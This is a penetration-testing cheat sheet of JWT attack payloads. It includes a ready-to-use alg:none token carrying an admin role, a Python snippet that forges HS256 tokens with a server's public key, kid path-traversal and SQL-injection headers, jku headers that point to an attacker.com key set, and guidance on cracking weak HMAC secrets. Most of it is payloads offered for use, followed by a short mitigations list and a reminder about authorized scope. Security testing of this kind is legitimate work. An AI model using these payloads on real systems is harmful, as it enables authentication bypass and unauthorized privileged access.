
# JWT (JSON WEB TOKEN) ATTACK PAYLOADS

[JWT DECODER & ENCODER](https://www.jwt.io/)

A JWT is `base64url(header).base64url(payload).base64url(signature)`. Most JWT attacks target either weak/missing signature verification, algorithm confusion, or trusting unvalidated claims — not breaking the underlying crypto itself.

## Structure Reference

| Part | Contains | Relevance |
|---|---|---|
| Header | `alg` (signing algorithm), `typ`, sometimes `kid` (key ID) | Attacker-controlled before signing — if the server trusts `alg`/`kid` from the token itself, this is the primary attack surface |
| Payload | Claims: `sub`, `exp`, `iat`, `role`, custom fields | Tampering here is only useful if signature verification can be bypassed or forged |
| Signature | HMAC or RSA/ECDSA signature over header+payload | The actual security boundary — every attack here is really an attempt to forge or bypass this |

## Algorithm-Based Attacks

| Technique | Payload Header | Purpose |
|---|---|---|
| `alg: none` | `{"alg":"none","typ":"JWT"}` | Tests whether the server accepts unsigned tokens — strip the signature entirely, set claims freely |
| RS256 → HS256 confusion | `{"alg":"HS256","typ":"JWT"}` (signed using the server's known RSA **public** key as the HMAC secret) | If the server uses the same key variable for both verifying RS256 and HS256 without checking which algorithm is expected, the public key (often retrievable) can be used to forge a valid HMAC signature |
| `kid` header injection (path traversal) | `{"alg":"HS256","kid":"../../../../dev/null"}` | If `kid` is used to look up the key from a file path without sanitization, pointing it at a predictable/empty file (like `/dev/null`) can result in an empty/known signing key |
| `kid` SQL injection | `{"alg":"HS256","kid":"x' UNION SELECT 'attacker_known_secret"}` | If `kid` is used in a DB lookup for the signing key, injection can return an attacker-chosen key |
| `jku`/`x5u` header injection | `{"alg":"RS256","jku":"https://attacker.com/jwks.json"}` | If the server fetches the verification key from a URL specified inside the token itself, point it at an attacker-hosted key set and sign with the matching private key |

## Claim Tampering (Once Signature Bypass Is Possible)

| Payload | Purpose |
|---|---|
| `{"role":"admin"}` | Privilege escalation via role claim |
| `{"sub":"1"}` (changed from victim's own ID) | Impersonate another user by ID |
| `{"exp":9999999999}` | Extend token expiry far into the future |
| `{"iss":"trusted-issuer"}` | Spoof issuer if validation is weak/missing |
| `{"aud":"internal-service"}` | Spoof intended audience to access a service that only checks this claim loosely |

## Secret Brute-Forcing (HS256)

| Technique | Purpose |
|---|---|
| Wordlist attack against the HMAC secret (`hashcat -m 16500`, `jwt_tool`, `c-jwt-cracker`) | If a weak/common secret was used to sign the token, recover it offline, then forge arbitrary tokens |
| Test for default/example secrets from common frameworks (`secret`, `changeme`, framework defaults) | Many real-world findings come from unrotated default signing secrets |

## EXAMPLE PAYLOADS

**`alg: none` bypass (header + payload, base64url-encoded, empty signature):**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.
```
*(decoded header: `{"alg":"none","typ":"JWT"}`, decoded payload: `{"sub":"1234567890","role":"admin"}`, trailing dot = empty signature)*

**RS256→HS256 confusion (conceptual, using server's public key as HMAC secret):**
```python
import jwt

public_key = open('server_public_key.pem').read()
forged_token = jwt.encode(
    {"sub": "1234567890", "role": "admin"},
    public_key,
    algorithm="HS256"
)
print(forged_token)
```

**kid path traversal:**
```
{"alg":"HS256","kid":"../../../../../../dev/null","typ":"JWT"}
```
*(sign with an empty-string key, since `/dev/null` resolves to empty content)*

**jku header pointing to attacker-controlled JWKS:**
```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json",
  "typ": "JWT"
}
```

## Tooling Note
Manual forging builds understanding of the underlying flaw, but `jwt_tool` automates most of these checks (none-alg, alg confusion, kid injection, secret brute-forcing) against a live target in one pass. Burp Suite's JWT extensions (e.g. "JSON Web Tokens") help intercept and re-sign tokens during manual testing. Stay within authorized scope — forged admin tokens can grant real unauthorized access if tested against production systems.

## Mitigations (for writeups)

- Explicitly whitelist the expected algorithm server-side; never trust the `alg` value from the token itself.
- Never use the same key/secret variable for both symmetric and asymmetric verification paths.
- Validate `kid` against a fixed, known set of key IDs — never use it directly in a file path or DB query.
- Don't fetch signing/verification keys from a URL supplied inside the token (`jku`/`x5u`) without restricting to a trusted, fixed source.
- Use a long, random, properly rotated secret for HS256 — never a default or guessable value.
- Always validate `exp`, `iss`, `aud`, and `nbf` claims server-side, not just signature validity.

## Quick Notes
- Most real-world JWT vulnerabilities come from implementation/config mistakes (trusting header fields, weak secrets), not breaking the cryptography itself.
- Always decode and inspect both header and payload first (`jwt.io` or `jwt_tool`) before attempting any forgery technique — confirms algorithm and claim structure.
- A successful `alg: none` or algorithm-confusion bypass is usually the highest-impact JWT finding, since it allows arbitrary claim forgery.
